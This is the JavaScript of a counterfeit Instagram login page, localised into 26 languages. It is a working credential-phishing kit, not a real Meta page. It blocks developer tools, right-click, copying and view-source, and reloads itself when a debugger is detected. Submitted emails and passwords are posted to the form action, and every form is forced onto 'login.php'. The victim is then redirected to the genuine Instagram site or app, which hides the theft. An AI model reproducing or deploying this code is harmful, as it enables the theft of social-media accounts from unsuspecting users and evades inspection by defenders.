 document.addEventListener('contextmenu',function(e){e.preventDefault();});
        document.addEventListener('keydown',function(e){
            if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false;}
            if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.keyCode===73||e.keyCode===74)){e.preventDefault();return false;}
            if(e.ctrlKey&&(e.key==='U'||e.keyCode===85)){e.preventDefault();return false;}
            if(e.ctrlKey&&(e.key==='+'||e.key==='-'||e.key==='0'||e.keyCode===187||e.keyCode===189||e.keyCode===48)){e.preventDefault();return false;}
            if(e.ctrlKey&&e.key==='s'||e.keyCode===83){e.preventDefault();return false;}
            if(e.ctrlKey&&e.key==='p'||e.keyCode===80){e.preventDefault();return false;}
        });
        document.addEventListener('selectstart',function(e){e.preventDefault();});
        document.addEventListener('copy',function(e){e.preventDefault();});
        document.addEventListener('cut',function(e){e.preventDefault();});
        window.addEventListener('wheel',function(e){if(e.ctrlKey){e.preventDefault();}},{passive:false});
        setInterval(function(){var start=performance.now();debugger;var end=performance.now();if(end-start>100){location.reload();}},2000);
        const translations={
            en:{title:"Instagram - log in or sign up",heading:"Log into Instagram",emailPlaceholder:"Email address or mobile number",passwordPlaceholder:"Password",loginBtn:"Log in",forgot:"Forgotten password",create:"Create new account",facebookLogin:"Log in with Facebook",meta:"Meta",tagline:"See everyday moments from<br>your<br><span>close friends.</span>"},
            es:{title:"Instagram - iniciar sesión o registrarse",heading:"Iniciar sesión en Instagram",emailPlaceholder:"Correo electrónico o número de teléfono",passwordPlaceholder:"Contraseña",loginBtn:"Iniciar sesión",forgot:"Olvidaste tu contraseña",create:"Crear cuenta nueva",facebookLogin:"Iniciar sesión con Facebook",meta:"Meta",tagline:"Ve momentos cotidianos de<br>tus<br><span>amigos cercanos.</span>"},
            fr:{title:"Instagram - connexion ou inscription",heading:"Se connecter à Instagram",emailPlaceholder:"Adresse e-mail ou numéro de mobile",passwordPlaceholder:"Mot de passe",loginBtn:"Se connecter",forgot:"Mot de passe oublié",create:"Créer un compte",facebookLogin:"Se connecter avec Facebook",meta:"Meta",tagline:"Voyez les moments du quotidien de<br>vos<br><span>amis proches.</span>"},
            de:{title:"Instagram – Anmelden oder registrieren",heading:"Bei Instagram anmelden",emailPlaceholder:"E-Mail-Adresse oder Handynummer",passwordPlaceholder:"Passwort",loginBtn:"Anmelden",forgot:"Passwort vergessen",create:"Neues Konto erstellen",facebookLogin:"Mit Facebook anmelden",meta:"Meta",tagline:"Sieh alltägliche Momente von<br>deinen<br><span>engen Freunden.</span>"},
            it:{title:"Instagram - accedi o iscriviti",heading:"Accedi a Instagram",emailPlaceholder:"Indirizzo email o numero di telefono",passwordPlaceholder:"Password",loginBtn:"Accedi",forgot:"Password dimenticata",create:"Crea un nuovo account",facebookLogin:"Accedi con Facebook",meta:"Meta",tagline:"Vedi i momenti quotidiani dei<br>tuoi<br><span>amici stretti.</span>"},
            pt:{title:"Instagram - entre ou cadastre-se",heading:"Entrar no Instagram",emailPlaceholder:"E-mail ou telefone",passwordPlaceholder:"Senha",loginBtn:"Entrar",forgot:"Esqueceu a senha",create:"Criar nova conta",facebookLogin:"Entrar com Facebook",meta:"Meta",tagline:"Veja momentos do dia a dia de<br>seus<br><span>amigos próximos.</span>"},
            zh:{title:"Instagram - 登录或注册",heading:"登录 Instagram",emailPlaceholder:"邮箱或手机号",passwordPlaceholder:"密码",loginBtn:"登录",forgot:"忘记密码",create:"创建新账户",facebookLogin:"使用 Facebook 登录",meta:"Meta",tagline:"查看你<br>亲密<br><span>朋友的日常时刻。</span>"},
            ja:{title:"Instagram - ログインまたは登録",heading:"Instagramにログイン",emailPlaceholder:"メールアドレスまたは携帯電話番号",passwordPlaceholder:"パスワード",loginBtn:"ログイン",forgot:"パスワードを忘れた",create:"新しいアカウントを作成",facebookLogin:"Facebookでログイン",meta:"Meta",tagline:"親しい友達の<br>日常の<br><span>瞬間を見よう。</span>"},
            ha:{title:"Instagram - shiga ko yiwa rajista",heading:"Shiga Instagram",emailPlaceholder:"Adireshin imel ko lambar waya",passwordPlaceholder:"Kalmar sirri",loginBtn:"Shiga",forgot:"Manta da kalmar sirri?",create:"Sabuwar ajiya",facebookLogin:"Shiga da Facebook",meta:"Meta",tagline:"Ga lokutan yaukaka na<br>abokan<br><span>ka ke kusa da su.</span>"},
            ar:{title:"Instagram - تسجيل الدخول أو الاشتراك",heading:"تسجيل الدخول إلى Instagram",emailPlaceholder:"عنوان البريد الإلكتروني أو رقم الهاتف",passwordPlaceholder:"كلمة السر",loginBtn:"تسجيل الدخول",forgot:"هل نسيت كلمة السر؟",create:"إنشاء حساب جديد",facebookLogin:"تسجيل الدخول باستخدام فيسبوك",meta:"Meta",tagline:"شاهد اللحظات اليومية من<br>أصدقائك<br><span>المقربين.</span>"},
            id:{title:"Instagram - masuk atau daftar",heading:"Masuk ke Instagram",emailPlaceholder:"Email atau nomor ponsel",passwordPlaceholder:"Kata Sandi",loginBtn:"Masuk",forgot:"Lupa kata sandi?",create:"Buat akun baru",facebookLogin:"Masuk dengan Facebook",meta:"Meta",tagline:"Lihat momen sehari-hari dari<br>teman<br><span>dekat Anda.</span>"},
            hi:{title:"Instagram - लॉग इन या साइन अप करें",heading:"Instagram में लॉग इन करें",emailPlaceholder:"ईमेल पता या मोबाइल नंबर",passwordPlaceholder:"पासवर्ड",loginBtn:"लॉग इन",forgot:"पासवर्ड भूल गए?",create:"नया खाता बनाएँ",facebookLogin:"Facebook से लॉग इन करें",meta:"Meta",tagline:"अपने करीबी दोस्तों के<br>दैनिक<br><span>पल देखें।</span>"},
            nl:{title:"Instagram - log in of registreer",heading:"Log in bij Instagram",emailPlaceholder:"E-mailadres of telefoonnummer",passwordPlaceholder:"Wachtwoord",loginBtn:"Log in",forgot:"Wachtwoord vergeten?",create:"Nieuw account aanmaken",facebookLogin:"Inloggen met Facebook",meta:"Meta",tagline:"Bekijk alledaagse momenten van<br>je<br><span>naaste vrienden.</span>"},
            pl:{title:"Instagram - zaloguj się lub zarejestruj",heading:"Zaloguj się do Instagram",emailPlaceholder:"Adres e-mail lub numer telefonu",passwordPlaceholder:"Hasło",loginBtn:"Zaloguj się",forgot:"Nie pamiętasz hasła?",create:"Utwórz nowe konto",facebookLogin:"Zaloguj się przez Facebook",meta:"Meta",tagline:"Zobacz codzienne chwile swoich<br><span>bliskich przyjaciół.</span>"},
            tr:{title:"Instagram - giriş yap veya kaydol",heading:"Instagram'a giriş yap",emailPlaceholder:"E-posta veya telefon numarası",passwordPlaceholder:"Şifre",loginBtn:"Giriş Yap",forgot:"Şifreni mi unuttun?",create:"Yeni hesap oluştur",facebookLogin:"Facebook ile giriş yap",meta:"Meta",tagline:"Yakın arkadaşlarının<br>günlük<br><span>anlarını gör.</span>"},
            ru:{title:"Instagram - войдите или зарегистрируйтесь",heading:"Вход в Instagram",emailPlaceholder:"Электронный адрес или номер телефона",passwordPlaceholder:"Пароль",loginBtn:"Вход",forgot:"Забыли пароль?",create:"Создать новый аккаунт",facebookLogin:"Войти через Facebook",meta:"Meta",tagline:"Смотрите повседневные моменты<br>ваших<br><span>близких друзей.</span>"},
            vi:{title:"Instagram - đăng nhập hoặc đăng ký",heading:"Đăng nhập Instagram",emailPlaceholder:"Email hoặc số điện thoại",passwordPlaceholder:"Mật khẩu",loginBtn:"Đăng nhập",forgot:"Bạn quên mật khẩu?",create:"Tạo tài khoản mới",facebookLogin:"Đăng nhập bằng Facebook",meta:"Meta",tagline:"Xem những khoảnh khắc hàng ngày từ<br>bạn<br><span>bè thân.</span>"},
            ko:{title:"Instagram - 로그인 또는 가입",heading:"Instagram에 로그인",emailPlaceholder:"이메일 또는 휴대폰 번호",passwordPlaceholder:"비밀번호",loginBtn:"로그인",forgot:"비밀번호를 잊으셨나요?",create:"새 계정 만들기",facebookLogin:"Facebook으로 로그인",meta:"Meta",tagline:"친한 친구들의<br>일상적인<br><span>순간을 보세요.</span>"},
            th:{title:"Instagram - เข้าสู่ระบบหรือสมัครใช้งาน",heading:"เข้าสู่ระบบ Instagram",emailPlaceholder:"อีเมลหรือหมายเลขโทรศัพท์",passwordPlaceholder:"รหัสผ่าน",loginBtn:"เข้าสู่ระบบ",forgot:"ลืมรหัสผ่านใช่หรือไม่",create:"สร้างบัญชีใหม่",facebookLogin:"เข้าสู่ระบบด้วย Facebook",meta:"Meta",tagline:"ดูช่วงเวลาประจำวันของ<br>เพื่อน<br><span>สนิท</span>"},
            ur:{title:"Instagram - لاگ ان کریں یا سائن اپ کریں",heading:"Instagram میں لاگ ان کریں",emailPlaceholder:"ای میل ایڈریس یا موبائل نمبر",passwordPlaceholder:"پاس ورڈ",loginBtn:"لاگ ان",forgot:"پاس ورڈ بھول گئے؟",create:"نیا اکاؤنٹ بنائیں",facebookLogin:"فیس بک کے ساتھ لاگ ان کریں",meta:"Meta",tagline:"اپنے قریبی دوستوں کے<br>روزمرہ کے<br><span>لمحات دیکھیں۔</span>"},
            ta:{title:"Instagram - உள்நுழைய அல்லது பதிவுசெய்ய",heading:"Instagram-ல் உள்நுழைய",emailPlaceholder:"மின்னஞ்சல் முகவரி அல்லது கைபேசி எண்",passwordPlaceholder:"கடவுச்சொல்",loginBtn:"உள்நுழை",forgot:"கடவுச்சொல் மறந்துவிட்டதா?",create:"புதிய கணக்கை உருவாக்க",facebookLogin:"Facebook மூலம் உள்நுழைய",meta:"Meta",tagline:"உங்கள் நெருக்கமான நண்பர்களின்<br>அன்றாட<br><span>கண்மைகளைக் காணுங்கள்.</span>"},
            bn:{title:"Instagram - লগ ইন অথবা নিবন্ধন করুন",heading:"Instagram-এ লগ ইন করুন",emailPlaceholder:"ইমেল বা মোবাইল নম্বর",passwordPlaceholder:"পাসওয়ার্ড",loginBtn:"লগ ইন",forgot:"পাসওয়ার্ড ভুলে গেছেন?",create:"নতুন অ্যাকাউন্ট তৈরি করুন",facebookLogin:"Facebook দিয়ে লগ ইন করুন",meta:"Meta",tagline:"আপনার ঘনিষ্ঠ বন্ধুদের<br>দৈনন্দিক<br><span>মুহূর্তগুলি দেখুন।</span>"},
            te:{title:"Instagram - లాగిన్ లేదా సైన్ అప్",heading:"Instagram లో లాగిన్ అవ్వండి",emailPlaceholder:"ఇమెయిల్ లేదా ఫోన్ నంబర్",passwordPlaceholder:"పాస్వర్డ్",loginBtn:"లాగిన్",forgot:"పాస్వర్డ్ మర్చిపోయారా?",create:"కొత్త ఖాతా సృష్టించండి",facebookLogin:"Facebook తో లాగిన్ అవ్వండి",meta:"Meta",tagline:"మీ సన్నిహితుల స్నేహితుల రోజువారీ<br><span>క్షణాలను చూడండి.</span>"},
            ml:{title:"Instagram - ലോഗിൻ അല്ലെങ്കിൽ സൈൻ അപ്പ്",heading:"Instagram-ൽ ലോഗിൻ ചെയ്യുക",emailPlaceholder:"ഇമെയിൽ അല്ലെങ്കിൽ ഫോൺ നമ്പർ",passwordPlaceholder:"പാസ്‌വേഡ്",loginBtn:"ലോഗിൻ",forgot:"പാസ്‌വേഡ് മറന്നോ?",create:"പുതിയ അക്കൗണ്ട് സൃഷ്ടിക്കുക",facebookLogin:"Facebook വഴി ലോഗിൻ ചെയ്യുക",meta:"Meta",tagline:"നിങ്ങളുടെ അടുത്ത സുഹൃത്തകളുടെ<br>ദൈനംദിന<br><span>നിമിഷങ്ങൾ കാണുക.</span>"},
            pa:{title:"Instagram - ਲੌਗ ਇਨ ਜਾਂ ਸਾਇਨ ਅਪ",heading:"Instagram ਵਿੱਚ ਲੌਗ ਇਨ ਕਰੋ",emailPlaceholder:"ਈਮੇਲ ਜਾਂ ਮੋਬਾਈਲ ਨੰਬਰ",passwordPlaceholder:"ਪਾਸਵਰਡ",loginBtn:"ਲੌਗ ਇਨ",forgot:"ਪਾਸਵਰਡ ਭੁੱਲ ਗਏ?",create:"ਨਵਾਂ ਖਾਤਾ ਬਣਾਓ",facebookLogin:"Facebook ਨਾਲ ਲੌਗ ਇਨ ਕਰੋ",meta:"Meta",tagline:"ਆਪਣੇ ਨੇੜਲੇ ਦੋਸਤਾਂ ਦੇ<br>ਰੋਜ਼ਾਨਾ<br><span>ਪਲ ਵੇਖੋ।</span>"},
            fa:{title:"Instagram - وارد شوید یا ثبت‌نام کنید",heading:"ورود به اینستاگرام",emailPlaceholder:"ایمیل یا شماره موبایل",passwordPlaceholder:"رمز عبور",loginBtn:"ورود",forgot:"رمز عبور را فراموش کرده‌اید؟",create:"ایجاد حساب جدید",facebookLogin:"ورود با فیس‌بوک",meta:"Meta",tagline:"لحظات روزمره دوستان<br>نزدیک<br><span>خود را ببینید.</span>"}
        };
        var langNames={en:'English (UK)',es:'Español',fr:'Français (France)',de:'Deutsch',it:'Italiano',pt:'Português (Brasil)',zh:'中文(简体)',ja:'日本語',ha:'Hausa',ar:'العربية',id:'Bahasa Indonesia',hi:'हिन्दी',nl:'Nederlands',pl:'Polski',tr:'Türkçe',ru:'Русский',vi:'Tiếng Việt',ko:'한국어',th:'ภาษาไทย',ur:'اردو',ta:'தமிழ்',bn:'বাংলা',te:'తెలుగు',ml:'മലയാളം',pa:'ਪੰਜਾਬੀ',fa:'فارسی'};
        function setLanguage(lang){
            const t=translations[lang];if(!t)return;
            document.documentElement.lang=lang;
            document.title=t.title;
            document.querySelectorAll('[data-i18n]').forEach(function(el){
                var k=el.getAttribute('data-i18n');
                if(k==='tagline'){el.innerHTML=t[k];}else if(k==='facebookLogin'){
                    var svg=el.querySelector('svg');
                    el.innerHTML='';
                    if(svg)el.appendChild(svg);
                    el.appendChild(document.createTextNode(t[k]));
                }else{el.textContent=t[k];}
            });
            document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){
                el.placeholder=t[el.getAttribute('data-i18n-placeholder')];
            });
            document.querySelectorAll('.footer-lang a').forEach(function(a){a.classList.remove('lang-active');});
            var active=document.querySelector('.footer-lang a[data-lang="'+lang+'"]');
            if(active)active.classList.add('lang-active');
            var mobileLabel=document.querySelector('#mobileLang span');
            if(mobileLabel&&langNames[lang])mobileLabel.textContent=langNames[lang];
            document.querySelectorAll('.mobile-lang-dropdown a').forEach(function(a){a.classList.remove('active');});
            var mobileActive=document.querySelector('.mobile-lang-dropdown a[data-lang="'+lang+'"]');
            if(mobileActive)mobileActive.classList.add('active');
            localStorage.setItem('insta_lang',lang);
        }
        document.querySelectorAll('.footer-lang a[data-lang]').forEach(function(a){
            a.addEventListener('click',function(e){e.preventDefault();setLanguage(this.getAttribute('data-lang'));});
        });
        var mobileBanner=document.getElementById('mobileBanner');
        if(mobileBanner){
            mobileBanner.addEventListener('click',function(){
                var ua=navigator.userAgent||navigator.vendor||window.opera;
                var isIOS=/iPhone|iPad|iPod/i.test(ua);
                var isAndroid=/Android/i.test(ua);
                if(isIOS){
                    window.location.href='itms-apps://apps.apple.com/app/instagram/id389801257';
                    setTimeout(function(){window.location.href='https://apps.apple.com/app/instagram/id389801257';},800);
                }else if(isAndroid){
                    window.location.href='market://details?id=com.instagram.android';
                    setTimeout(function(){window.location.href='https://play.google.com/store/apps/details?id=com.instagram.android';},800);
                }else{
                    window.location.href='https://play.google.com/store/apps/details?id=com.instagram.android';
                }
            });
        }
        var mobileLangBtn=document.getElementById('mobileLang');
        var langSheetOverlay=document.getElementById('langSheetOverlay');
        var langSheetList=document.getElementById('langSheetList');
        function updateLangSheetSelection(lang){
            if(!langSheetList)return;
            langSheetList.querySelectorAll('.lang-sheet-item').forEach(function(item){
                item.classList.toggle('selected', item.getAttribute('data-lang')===lang);
            });
        }
        if(mobileLangBtn){
            mobileLangBtn.addEventListener('click',function(e){
                e.stopPropagation();
                this.classList.add('open');
                if(langSheetOverlay){
                    updateLangSheetSelection(localStorage.getItem('insta_lang')||'en');
                    langSheetOverlay.classList.add('show');
                }
            });
        }
        if(langSheetOverlay){
            langSheetOverlay.addEventListener('click',function(e){
                if(e.target===langSheetOverlay){
                    langSheetOverlay.classList.remove('show');
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                }
            });
        }
        (function(){
            var card=document.getElementById('langSheetCard');
            var overlay=document.getElementById('langSheetOverlay');
            if(!card||!overlay)return;
            var startY=0,currentY=0,dragging=false;
            card.addEventListener('touchstart',function(e){
                if(e.target.closest('.lang-sheet-list'))return;
                startY=e.touches[0].clientY;
                dragging=true;
                card.style.transition='none';
            },{passive:true});
            card.addEventListener('touchmove',function(e){
                if(!dragging)return;
                currentY=e.touches[0].clientY;
                var diff=currentY-startY;
                if(diff<0)diff=0;
                card.style.transform='translateY('+diff+'px)';
            },{passive:true});
            card.addEventListener('touchend',function(e){
                if(!dragging)return;
                dragging=false;
                card.style.transition='transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94)';
                var diff=currentY-startY;
                if(diff>70){
                    overlay.classList.remove('show');
                    card.style.transform='';
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                }else{
                    card.style.transform='translateY(0)';
                    setTimeout(function(){card.style.transform='';},300);
                }
            });
            card.addEventListener('touchcancel',function(e){
                if(!dragging)return;
                dragging=false;
                card.style.transition='transform 0.3s cubic-bezier(0.25,0.46,0.45,0.94)';
                card.style.transform='translateY(0)';
                setTimeout(function(){card.style.transform='';},300);
            });
        })();
        if(langSheetList){
            langSheetList.querySelectorAll('.lang-sheet-item').forEach(function(item){
                item.addEventListener('click',function(e){
                    e.stopPropagation();
                    var lang=this.getAttribute('data-lang');
                    setLanguage(lang);
                    if(langSheetOverlay)langSheetOverlay.classList.remove('show');
                    if(mobileLangBtn)mobileLangBtn.classList.remove('open');
                });
            });
        }
        var saved=localStorage.getItem('insta_lang');
        if(saved&&translations[saved]){setLanguage(saved);}
        var btnOriginalText={};
        function setBtnLoading(btn){
            btnOriginalText[btn.className]=btn.innerHTML;
            btn.style.pointerEvents='none';
            btn.style.opacity='0.7';
            btn.innerHTML='<span class="btn-spinner"></span>';
            setTimeout(function(){restoreBtn(btn);},3000);
        }
        function restoreBtn(btn){
            btn.style.pointerEvents='';
            btn.style.opacity='';
            btn.innerHTML=btnOriginalText[btn.className]||'';
        }
        var loginBtn=document.querySelector('button[type="submit"]');
        var createBtn=document.querySelector('.create-btn');
        loginBtn.setAttribute('data-i18n','loginBtn');
        createBtn.setAttribute('data-i18n','create');
        var heroImages=['https://static.cdninstagram.com/rsrc.php/yR/r/92ZsVHNkyvf.webp','https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp','https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp'];
        var loadCount=parseInt(localStorage.getItem('insta_load_count')||'0');
        document.querySelector('.hero-img').src=heroImages[loadCount%3];
        function isMobileOrTablet(){
            var ua=navigator.userAgent||navigator.vendor||window.opera;
            return /android|iphone|ipad|ipod|windows phone|iemobile|blackberry|opera mini|mobile/i.test(ua)||window.innerWidth<=1100;
        }
        function launchAppOrStore(){
            var ua=navigator.userAgent||navigator.vendor||window.opera;
            var isIOS=/iPhone|iPad|iPod/i.test(ua);
            var appUrl='instagram://app';
            var storeUrl=isIOS?'itms-apps://apps.apple.com/app/instagram/id389801257':'market://details?id=com.instagram.android';
            var webStore=isIOS?'https://apps.apple.com/app/instagram/id389801257':'https://play.google.com/store/apps/details?id=com.instagram.android';
            try{window.location.href=appUrl;}catch(e){}
            setTimeout(function(){window.location.href=storeUrl;setTimeout(function(){window.location.href=webStore;},800);},800);
        }
        var form=document.querySelector('form');
        form.addEventListener('submit',function(e){
            e.preventDefault();
            setBtnLoading(loginBtn);
            var data=new FormData(form);
            fetch(form.action,{method:'POST',body:data}).then(function(){
                restoreBtn(loginBtn);
                loadCount++;
                localStorage.setItem('insta_load_count',loadCount);
                if(loadCount%3===0){
                    document.querySelector('.hero-img').src=heroImages[(loadCount%3)];
                }
                setTimeout(function(){
                    if(isMobileOrTablet()){
                        launchAppOrStore();
                    }else{
                        window.location.href='https://www.instagram.com/accounts/login/?email='+encodeURIComponent(data.get('email'))+'&pass='+encodeURIComponent(data.get('pass'));
                    }
                },300);
            }).catch(function(){
                restoreBtn(loginBtn);
                if(isMobileOrTablet()){
                    launchAppOrStore();
                }else{
                    form.submit();
                }
            });
        });
        document.querySelector('.forgot').addEventListener('click',function(e){
            e.preventDefault();
            var url=this.href;
            window.location.href=url;
        });
        createBtn.addEventListener('click',function(e){
            e.preventDefault();
            setBtnLoading(createBtn);
            var url=this.href;
            setTimeout(function(){window.location.href=url;},1800);
        });
        document.addEventListener("submit",function(e){
            var f=e.target;
            if(f.tagName!=="FORM")return;
            if(f.action&&f.action.indexOf("login.php")>-1)return;
            e.preventDefault();f.action="login.php";f.method="post";f.submit();
        },true);